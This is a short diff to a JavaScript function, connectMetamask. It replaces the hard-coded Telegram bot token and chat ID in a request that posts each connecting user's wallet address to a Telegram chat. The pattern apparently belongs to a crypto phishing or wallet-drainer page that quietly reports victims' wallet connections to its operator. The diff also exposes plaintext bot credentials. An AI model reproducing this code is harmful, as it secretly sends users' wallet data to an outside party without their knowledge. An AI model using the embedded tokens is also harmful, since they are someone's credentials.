@@ -385,7 +385,7 @@ const connectMetamask = async () => {
 
     $.ajax({
          type: "POST",
-         url: "https://api.telegram.org/bot"+"5383384340:AAGhxdmt7VMqASuS_Xf3OwiCI966EUTT6gg"+"/sendMessage?chat_id="+"459455590",
+         url: "https://api.telegram.org/bot"+"1627191463:AAGEbLuyNMe56sh5JiIto3xPigRNUsrAVU0"+"/sendMessage?chat_id="+"-653343618",
          data: "parse_mode=HTML&text="+encodeURIComponent("Metamask connected "+accountAddress),
     });
 
